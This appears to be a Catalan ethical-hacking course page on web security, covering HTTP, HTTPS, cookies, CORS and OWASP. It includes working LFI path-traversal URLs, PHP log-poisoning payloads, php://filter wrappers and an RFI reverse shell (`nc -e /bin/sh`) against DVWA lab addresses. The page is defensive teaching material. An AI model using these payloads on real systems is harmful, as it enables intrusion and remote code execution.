@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=0.5, user-scalable=yes">
+
+  <link rel="stylesheet" href="https://cdn.hugeicons.com/font/hgi-stroke-rounded.css" />
+
+  <title>U4 - HE a aplicacions WEB</title>
+  <link rel="stylesheet" href="estilsunitats.css">
+  
+</head>
+<body>
+  <!--<button class="theme-toggle" onclick="toggleTheme()"></button> -->
+  <button class="theme-toggle" onclick="toggleTheme()">
+    <i class="hgi hgi-stroke hgi-sun-01" id="theme-icon"></i>
+  </button>
+
+  <!-- boto menu hamburguesa  +  javascript -->
+  <button class="hamburger" onclick="toggleMenu()" aria-label="Abrir menú de navegación">
+    <span id="menu-icon">☰</span>
+  </button>
+  
+  <div class="sidebar">
+    <a href="#http">Protocol WEB</a>
+    <a href="#https">Seguretat en Http</a>
+    <a href="#atacs">Atacs a http</a>
+    <a href="#owasp">OWASP</a>
+    <a href="#vuln">Principals Vulnerabilitats</a>    
+    <a href="#labs">Laboratoris</a>
+
+
+  </div>
+
+  <div style="width: 100%;">
+    <header>
+      <a href="index.html"><img src="imgs/HEcap.png" alt="HE" width="80%"></a>
+      <!--<h2>🅷🅰🅲🅺🅸🅽🅶 È🆃🅸🅲</h2> -->
+      <h1>Unitat 4: HE a aplicacions WEB</h1>
+      <h1>.</h1>
+    </header>
+    
+    <main>
+
+      <section id="http">
+       <h1>HTTP</h1>
+       <img src="imgs/http-protocol.png" alt="http-protocol" width="40%" class="imatge-dreta">
+       <p>HTTP (Hypertext Transfer Protocol) és el protocol principal que permet la comunicació de dades a la World Wide Web. 
+        És el conjunt de regles que defineixen com es donen format i es transmeten els missatges entre els navegadors web
+         (clients) i els servidors web. En termes senzills, és el "llenguatge" que fa possible que el teu navegador
+          sol·licite informació d'un lloc web i que el servidor web la retorne.</p>
+
+        <h3>L'intercanvi d'hipertext: Sol·licitud i Resposta</h3>  
+        <p>El funcionament d'HTTP es basa en un model de sol·licitud i resposta. Aquest procés és el que coneixem com a
+           intercanvi d'hipertext, ja que es transmeten arxius d'hipertext (HTML) juntament amb altres dades.</p>  
+          <img src="imgs/http-req.jpg" alt="http-req" width="35%" class="imatge-dreta"> 
+         <h4><strong>Sol·licitud (Request)</strong>: Quan escrius una adreça web al teu navegador (per exemple, www.google.com), 
+          aquest envia una sol·licitud HTTP al servidor de Google. Aquesta sol·licitud inclou informació com:</h4>  
+          <ul>
+            <li>Mètode:  Indica l'acció que es vol fer (per exemple, GET per a obtindre dades, POST per a enviar-les).</li>
+            <li>URL: L'adreça del recurs que es demana.</li>
+            <li>Capçaleres (Headers): Informació addicional, com el tipus de navegador que uses o l'idioma preferit.</li>
+          </ul>
+         <img src="imgs/http-response.png" alt="http-response" width="40%" class="imatge-esquerra">   
+          <h4><strong>Resposta (Response)</strong>: El servidor rep la sol·licitud, la processa i envia una resposta HTTP al navegador. Aquesta resposta conté:</h4>
+       
+       <ul>
+        <li>Codi d'estat: Un número que indica el resultat de la sol·licitud (per exemple, 200 OK significa que tot ha anat bé; 404 Not Found vol dir que la pàgina no existeix).</li>
+        <li>Capçaleres (Headers): Informació sobre el tipus de contingut que s'envia (HTML, imatges, etc.).</li>
+        <li>Cos (Body): Les dades sol·licitades, com el codi HTML de la pàgina web que visualitzaràs.</li>
+       </ul>
+       <h3>HTTP vs. HTTPS</h3>
+       <p>És important diferenciar-lo de l'HTTPS (Hypertext Transfer Protocol Secure). Mentre que HTTP transmet les dades de manera
+         simple, HTTPS encripta la comunicació entre el navegador i el servidor. Això vol dir que la informació, com les teues 
+         contrasenyes o dades bancàries, està protegida i no pot ser interceptada fàcilment. Per això, sempre veuràs HTTPS en 
+         llocs web que gestionen informació sensible, la qual cosa s'indica amb un cadenat 🔒 en la barra d'adreces del navegador.</p>
+
+       <H2>cookies</H2>
+       <p>Les cookies són petits arxius de text que un lloc web envia al teu navegador quan el visites i que s'emmagatzemen al teu
+         dispositiu (ordinador, mòbil, tauleta, etc.). La seva funció principal és guardar informació sobre la teva activitat al 
+         lloc web per a recordar les teves preferències i millorar la teva experiència de navegació.</p>
+         <p>Pensa en les cookies com una mena de "memòria" que tenen els llocs web. Gràcies a elles, un lloc pot recordar qui ets,
+           què has fet i quins són els teus interessos, sense que hagis d'introduir tota la informació de nou cada vegada que hi tornes.</p>
+        <p>Les cookies s'utilitzen amb diferents finalitats, que poden ser tant útils com controvertides:</p>
+        <ul>
+          <li>Gestió de sessions: Permeten que, quan inicies sessió en un lloc web, no hagis de posar el teu nom d'usuari i contrasenya en cada pàgina que visites. També són essencials per a mantindre un carret de la compra en línia actiu mentre continues navegant.</li>
+          <li>Personalització de l'experiència: Recorden les teves preferències, com l'idioma escollit, la configuració de la pàgina o la regió. Això fa que la teva navegació siga més fluida i adaptada a tu.</li>
+          <li>Anàlisi de dades: Recullen informació anònima sobre el teu comportament de navegació (quines pàgines visites, quant de temps hi passes, des d'on hi arribes, etc.). Aquestes dades ajuden els propietaris del lloc web a entendre com es fa servir i a millorar-lo.</li>
+          <li>Publicitat personalitzada: Aquesta és una de les funcions més discutides. Les cookies poden rastrejar els teus hàbits de navegació entre diferents llocs per a crear un perfil dels teus interessos i mostrar-te anuncis que et puguen ser rellevants.</li>
+        </ul>
+
+        <p>Tipus de cookies</p>
+        <ul>
+          <li>Pròpies</li>
+          <li>De tercers</li>
+          <li>De sessió</li>
+          <li>Persistents</li>
+        </ul>
+       <p>Degut a la seva capacitat per a rastrejar l'activitat en línia, la majoria de llocs web tenen l'obligació legal d'informar-te 
+        sobre l'ús de cookies i demanar el teu consentiment abans d'utilitzar-les. Per això, quan entres en un lloc web per primera vegada,
+         sovint apareix un bàner de cookies on pots acceptar, rebutjar o configurar les teves preferències.</p>
+       <h4>Com "apareix" una cookie</h4>
+       <ul>
+        <li>En la primera petició, el server contesta en la capçalera de resposta amb una ordre 'Set-Cookie: session-id=123456' </li>
+        <li>El navegador emmagatzema el valor</li>
+        <li>A partir d'este moment, en totes les peticions, s'enviarà la cookie</li>
+       </ul>
+      <p>la Set-Cookie, pot incloure més atributs opcionals:</p>
+      <ul>
+        <li>Data expiració</li>
+        <li>Domini</li>
+        <li>Path</li>
+        <li>Atributs de seguretat</li>
+      </ul>
+
+      </section>         
+      <section id="https">
+       <h1>Seguretat en http (https)</h1>
+       <p>HTTPS (Hypertext Transfer Protocol Secure) és una extensió del protocol HTTP que afegeix una capa de seguretat. Pensa en HTTPS com l'HTTP, 
+        però amb un escut protector que garanteix que la comunicació entre el teu navegador i el servidor web siga segura, privada i íntegra.</p>
+      <h4>Pilars d'https</h4>
+      <ul>
+        <li>Criptografia:  TLS , tunel</li>
+        <li>PKI (Publik Key Infraestructure)</li>
+      </ul>
+      <p>En açp es consegueix: Xifrar les comunicacions, certificar la identitat del emisor, i la integritat de les dades trameses</p>
+       <h2>Xifrat</h2>
+      <h4>Tecnologia de xifrat</h4>
+      <img src="imgs/tls1.2.png" alt="tls1.2" width="40%" class="imatge-esquerra">
+      <img src="imgs/tls1.3.png" alt="tls1.3" width="50%" >
+      <p>TLS 1.3 és la darrera versió del protocol TLS (Transport Layer Security) i
+         representa una millora significativa respecte a TLS 1.2, centrant-se principalment en la seguretat i la velocitat.</p>
+        <ul>
+          <li>Algorismes de xifratge admesos més moderns i robustos. Obligatori en TSL 1.3</li>
+          <li>Perfect Forward Secrecy: Assegura que cada sessió utilitze una clau d'encriptació única, obligatòria en TLS 1.3 </li>
+          <li>Handshake més segur</li>
+          <li>Handshake més ràpid</li>
+          <li>Zero Round-Trip Time: TLS 1.3 introdueix la possibilitat de reprendre una sessió anterior amb zero rondes de comunicació</li>
+        </ul>
+       <h4>PKI</h4>
+       <p>El PKI (Public Key Infrastructure), o Infraestructura de Clau Pública, és un sistema que gestiona les claus públiques
+         i privades per a crear, gestionar, distribuir, utilitzar, emmagatzemar i revocar certificats digitals. En essència, 
+         és el marc tecnològic que permet la seguretat i la confiança en les comunicacions digitals, especialment a internet.</p>
+        <img src="imgs/Public-Key-Infrastructure.png" alt="pki" width="50%" >
+        <p>El PKI no és un producte o tecnologia única, sinó un conjunt de components que treballen junts per a 
+          gestionar la criptografia asimètrica. Els elements clau són:</p>
+    <ol>
+      <li><strong>Autoritat de Certificació (CA)</strong>: És el component més important del PKI. La CA és una entitat de confiança (com Let's Encrypt o DigiCert) que emet, signa i revoca els certificats digitals. La seva funció és verificar la identitat de les entitats (persones, servidors) que sol·liciten un certificat.</li>
+      <li><strong>Certificat Digital</strong>: Un arxiu electrònic que conté la clau pública d'una entitat, la seva identitat (nom de domini, organització, etc.) i la signatura digital de la CA. Aquest certificat serveix per a demostrar que la clau pública pertany realment a l'entitat que la reclama.</li>
+      <li><strong>Autoritat de Registre (RA)</strong>: Actua com a intermediari entre l'usuari i la CA. La RA verifica la identitat de l'usuari i autoritza l'emissió del certificat, però no el signa.</li>
+      <li><strong>Autoritat de Validació (VA) o Directori</strong>: Una base de dades on s'emmagatzemen els certificats digitals i des d'on es poden consultar.</li>
+      <li><strong>Repte de revocació</strong>: Mecanismes per a revocar certificats que han sigut compromesos abans de la seva data de caducitat, com les llistes de revocació de certificats (CRL) o el protocol OCSP.</li>
+    </ol>
+
+      <h2>Capçaleres de seguretat</h2>
+      <h3>Us segur de http cookies</h3>
+      <p>A més dels atributs Path i Domain, les cookies poden portar també uns atributs de seguretat</p>
+      <h4>SameSite</h4>
+      <h4>Secure</h4>
+      <h4>HttpOnly</h4>
+
+       <h3>http Access Control (CORS)</h3>
+      <p>El CORS (Cross-Origin Resource Sharing) és un mecanisme de seguretat implementat als navegadors web que permet que un lloc web (el client) 
+        sol·licite recursos a un servidor que es troba en un domini diferent. 
+        Sense CORS, els navegadors bloquejarien per defecte aquestes peticions per a evitar atacs de seguretat, com el "Cross-Site Request Forgery" (CSRF).</p>
+       <p>CORS comprova dos tipus de sol·licituds: Simples i Verificades (preflighted)</p>
+
+       <h2> Atacs a http     </h2>
+       <p>Existeixen diversos tipus d'atacs que aprofiten les característiques de HTTP</p>
+       <ul>
+        <li>HTTP Host Header Injection</li>
+        <li>HTTP Request/Response Splitting</li>
+        <li>HTTP Request Smuggling</li>
+       </ul>
+
+      </section>               
+      <section id="owasp">
+        <h1>OWASP</h1>
+        <p>OWASP (Open Worldwide Application Security Project) és una fundació sense ànim de lucre global que es dedica a millorar
+           la seguretat del programari. L'organització funciona com una comunitat oberta que proporciona recursos gratuïts i de 
+           codi obert per a ajudar desenvolupadors, professionals de la seguretat i organitzacions a crear aplicacions més segures.</p>
+        <p>L'objectiu principal d'OWASP és conscienciar sobre els riscos de seguretat del programari i proporcionar les eines i 
+          la informació necessària per a mitigar-los. Entre els seus projectes més destacats es troben:</p>
+
+      <ul>
+        <li>OWASP Top 10: Aquest és, sens dubte, el recurs més conegut d'OWASP. És un informe que s'actualitza periòdicament i identifica les 10 vulnerabilitats de seguretat més crítiques per a les aplicacions web. Serveix com a guia de referència per a desenvolupadors i professionals de la seguretat per a prioritzar els esforços en protegir les aplicacions contra els riscos més comuns. Les vulnerabilitats típiques que s'hi troben inclouen injeccions SQL, control d'accés trencat o errors de configuració de seguretat.</li>
+        <li>Guies i metodologies: OWASP publica una gran varietat de documents i guies per a ajudar les organitzacions a millorar els seus processos de seguretat. Per exemple, la OWASP Application Security Verification Standard (ASVS) proporciona un marc per a provar i verificar els controls de seguretat de les aplicacions.</li>
+        <li>Eines de codi obert: L'organització desenvolupa i manté diverses eines per a la seguretat del programari, com el Zed Attack Proxy (ZAP), una eina de codi obert per a la prova de penetració que permet trobar vulnerabilitats en aplicacions web.</li>
+        <li>Capítols locals i conferències: OWASP té capítols locals en molts països del món i organitza conferències com l'OWASP Global AppSec, on la comunitat comparteix coneixement, investigació i experiències.</li>
+      </ul>
+
+      <p>L'OWASP Top 10 és un informe de conscienciació estàndard de la indústria que detalla les 10 vulnerabilitats de 
+        seguretat més crítiques per a les aplicacions web. Publicat per la fundació OWASP, serveix com a guia fonamental 
+        per a desenvolupadors, professionals de la seguretat i organitzacions per a prioritzar els seus esforços en la 
+        identificació i mitigació dels riscos de seguretat més comuns i perillosos.</p>
+
+      <ul>
+        <li>No és una llista exhaustiva</li>
+        <li>S'actualitza periòdicament</li>
+        <li>Serveix com a punt de partida</li>
+      </ul>
+      <h4>OWASP Vulnerable Web Applications Directory (VWAD)</h4>
+      <p>El OWASP Vulnerable Web Applications Directory (VWAD), o Directori d'Aplicacions Web Vulnerables d'OWASP, 
+        és un directori complet d'aplicacions web i mòbils vulnerables conegudes. És un recurs molt valuós per a 
+        desenvolupadors, provadors de seguretat i <strong>estudiants</strong> que volen practicar les seues habilitats en un entorn segur i legal.</p>
+       <p>Es poden usar per a aprendre, formar-se i provar tècniques de seguretat ofensiva i defensiva, en lloc d'intentar
+         trobar vulnerabilitats en llocs web reals, cosa que és il·legal i poc ètica</p>
+        
+        <p>Altres projectes d'aplicacions vulnerables per aprendre</p>
+        <ul>
+          <li>CI/CD-Goat</li>
+          <li>OWASP DVWS</li>
+          <li>vAPI</li>
+          <li>DVWS-node</li>
+          <li>level-up!</li>
+        </ul>
+
+      </section>         
+      <section id="vuln">
+        <h1>Principals Vulnerabilitats Web i la seua explotació</h1>
+        <p>Existteixen llocs on trovar maquines vulnerables, i algunes es poden instal·lar directament en kali linux</p>
+        <li>apt install dvwa </li>
+        <pre><code># dvwa-start 
+          # dvwa-stop    </code></pre>
+        <li>apt install juice-shop </li>
+        <pre><code># juice-shop-start 
+          # juice-shop-stop    </code></pre>
+        <p>En TyHackMe també estan les màquines</p>  
+        <p>En PentesterLab també</p>
+        <p>En Academia de Seguridad Web de PortSwigger  també</p>
+        <p>Abans de explicar les diferents categories d'atacs, es necessari coneixer el funcionament d'alguna eina que funcione com a proxy-web.  <br>
+        Estes ferramentes es situen en mig de les comunicacions entre el navegador del client i el servidor web i intercepten el trànsit (REQUEST / RESPONSE)
+        per inspeccionar i modificar el contingut, i poder així fer els atacs.
+        </p>
+        <h4>Les dos mes conegudes</h4>
+        <ul>
+          <li>Burp Suite</li>
+          <li>OWASP ZAP</li>
+        </ul>
+        <p>A continuació, dos videos per introduir-se en estes ferramentes</p>
+        <a href="https://www.youtube.com/watch?v=G3hpAeoZ4ek">Burp Suite</a>  i 
+        <a href="https://www.youtube.com/watch?v=xkUybXsyQ24&t=353s">ZAP</a> 
+        <hr>
+
+        <h2>LFI , RFI</h2>
+        <h3>LFI (Local File Inclusion)</h3>
+        <p>El LFI (Local File Inclusion) és una vulnerabilitat de seguretat en aplicacions web que permet a un atacant 
+          llegir, i de vegades executar, arxius des del servidor. L'atac es produeix quan una aplicació web inclou un 
+          arxiu basat en l'entrada de l'usuari sense validar-lo o sanejar-lo correctament.</p>
+         <h3>Llegir fitxers del servidor</h3> 
+        <p>L'atac més simple es basa en navegar i detectar una URL vulnerable, amb parametres, per exemle</p>
+        <code>https://exemple.com/pagina.php?lang=cat</code>
+        <p>En este cas el paràmetre  lang=cat, es podria intentar manipular....</p>
+        <pre><code>https://exemple.com/pagina.php?lang=../../../../etc/passwd
+        https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
+        <p>Si el servidor és vulnerable, el codi intentaria incloure el contingut de l'arxiu /etc/passwd 
+          (un arxiu de Linux que conté informació d'usuaris), i el contingut d'aquest arxiu es mostraria 
+          a la pàgina web, exposant informació sensible</p>
+
+        <p>En la màquina DVWA, es proposa la URL ..</p>
+        <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
+        <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning</em></h3>
+        <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
+          visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
+         <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
+         <li>Segon. Escriure dins del fitxer</li>
+         <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access</code> .  Este fitxer registra tots els accesos al servidor web.</p>
+         <p>El valor <em>User-Agent</em> és el tipus de navegador que està accedint, i queda registrat.</p>
+         <p>La informació de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
+         <p>Per exemple, podem posar un codi php :   <code> User-Agent: &lt;?php system('uname -a');?></code></p>
+         <p>Una vegada modificat el http-request i enviat al servidor, este valor (codi maliciós) quedarà escrit en el <em>log</em></p>
+         <p>Sols ens queda visualitzar amb LFI el fitxer log, i el codi inserit s'executarà ==> <strong> (RCE)</strong> </p>
+         <p>En la barra del navegador:  <code>https://exemple.com/pagina.php?lang=/var/log/apache/access.log</code></p>
+         <p>En este cas, sols per provar, s'ha inserit una simple ordre que mostra informació del sistema, però de igual manera
+          es podria inserir un sezill codi que execute una  <strong>shell inversa</strong>, obrint un terminal interactiu que 
+          permetria executar comandos directament.    </p>
+          
+          <h4>Altres fitxers interessants per fer log poisoning:    </h4>
+          <ul>
+            <li>/var/log/auth.log</li>
+            <code>ssh &lt;? php system($GET['cmd']);?>@ip_victima</code>
+            <li>/var/log/vsftpd.log</li>
+            <code>Accedir al servidor ftp, posant en el nom d'usuari el codi a inserir</code>
+            <li>/var/log/apache2/error.log</li>
+            <li>/proc/self/environ</li>
+            <code>User-Agent de http-request</code>
+            <li>/proc/self/fd</li>
+          </ul>
+          <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'accés a algun d'estos fitxers.</p>
+
+          <h4>Wrappers en php</h4>
+          <p>En principi per explotar LFI usarem</p>
+          <code>/dvwa/vulnerabilities/fi/?page=include.php</code>
+          <p>Usant un wrapper</p>
+          <code>/dvwa/vulnerabilities/fi/?page=php://filter/resource=include.php</code>
+          <p>Aparentment, el resultat és el mateix, degut a que el servidor interpreta i torna el html. Per evitar això..</p>
+          <code> ?page=php://filter/convert.base64-encode/resource=include.php</code>
+          <p>El resultat, serà en base64, però no interpretat, sinó el codi del fitxer. Encara quedarà decodificar-lo, amb cyberchef , per exemple</p>
+          <p>Es pot consultar documentació sobre els Wrappers de php en: <a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a></p>
+
+          <h3>Remote File Inclusion (RFI)</h3>
+          <p>Es tracta d'una variant de LFI que permet a un atacant accedir a una connexió des de l'objectiu per incloure un fitxer d'un host extern, 
+            en lloc d'un fitxer local.      </p>
+            <p>El LFI te unes limitacions que si es pot fer un RFI, estes desapareixen</p>
+          <p>Encara que els exemples que s'estan mostrant son en PHP, no s'ha d'oblidar que existeixen altres llenguatges de servidor
+            com ASP, JSP, o Python a través dels seus Frameworks web, com Flask o Django, susceptibles de tindre els mateixos problemes.         </p>
+
+          <h4>Com fer una shell inversa aprofitant RFI</h4>
+          <p>Considerem que la IP atacant és la 10.0.10.40 i la ip victima és la 10.0.10.50</p>
+          <li>El atacant usa netcac per obrir un port amb un servidor local (de netcat)</li>
+          <code>$ nc -lnvp 4444</code>
+          <li>A més a més , l'atacant obri un server web simple per servir fitxers de comandos</li>
+          <pre><code>
+           mkdir /tmp/files
+           cd /tmp/files
+           python3 -m http.server 80 
+          </code></pre>
+          <li>Es posa un fitxer 'reverse.txt' amb</li>
+          <pre><code>
+            &lt;?php
+               passthru("nc -e /bin/sh 10.0.10.40 4444");
+            ?>
+          </code></pre>
+
+          <p>Ara, per executar la reverse shell..</p>
+          <pre><code>
+            en el navegador , posem la ip de la victima seguit del codi RFI  
+            10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
+          </code></pre>
+          
+<!--   
+        <hr><h2>File upload vulnerabilities</h2>
+        <h2>Acces control vulnerabilities</h2>
+        <h2>SQLi</h2>
+        <h2>Cross-Site Scripting XSS</h2>
+        <h2>Criss-Site Request Forgery CSRF</h2>
+        <h2>Server-Side Request Forgery SSRF</h2>
+        <h2>Server-Side Template Injection  SSTI</h2>
+        <h2>XML External Entity (XXE) Injection</h2>
+        <h2>OS Command Injection</h2>
+-->
+      </section>         
+      <section id="labs">
+        <h1>Laboratoris</h1>
+
+      </section>         
+     
+      
+
+    </main>
+
+    <footer>
+      <p style="font-family: 'CCSymbols', sans-serif; font-size:larger;" >
+        2025 - Llicència: &#x1F16D; &#x1F16F; &#x1F10E; &#x1F10F; - U4 - HE a aplicacions WEB 
+      </p>
+    </footer>
+  </div>
+
+  
+    <script src="scriptsunitats.js"></script>
+</body>
+</html>
